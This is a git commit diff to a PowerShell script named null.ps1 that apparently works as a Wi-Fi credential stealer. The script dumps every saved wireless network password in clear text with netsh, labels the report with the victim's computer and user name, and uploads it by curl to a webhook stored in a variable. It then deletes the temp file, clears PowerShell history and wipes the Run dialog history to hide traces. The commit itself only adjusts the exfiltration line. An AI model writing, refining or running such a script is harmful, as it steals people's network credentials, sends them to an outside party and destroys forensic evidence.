83a107a7252a0d3e31dc0d4620b0bb3d0c028ef9
deathesther <122229257+Esther7171@users.noreply.github.com>
2026-06-19 13:04:55 +0530

    Update null.ps1

--- scripts/null.ps1
+++ scripts/null.ps1
@@ -3,7 +3,7 @@ $f=$env:TEMP+"\r"+[string](Get-Random)+".txt"
 $r="[r00t_b0t] "+$env:COMPUTERNAME+" | "+$env:USERNAME
 netsh wlan show profiles|Select-String "All User Profile"|ForEach-Object{$n=($_ -split ":")[1].Trim();$p=netsh wlan show profile name=$n key=clear|Select-String "Key Content";if($p){$r=$r+"`n"+$n+" : "+($p -split ":")[1].Trim()}}
 $r|Out-File $f -Encoding UTF8
-curl.exe -s -X POST $wh -F "payload_json={""content"":""r00t_b0t hit!""}" -F "file1=@$f;type=text/plain"
+curl.exe -s -X POST $wh -H "Content-Type: multipart/form-data" -F "payload_json={""content"": ""r00t_b0t hit!""}" -F "file1=@$f"
 Remove-Item $f -Force -ErrorAction SilentlyContinue
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
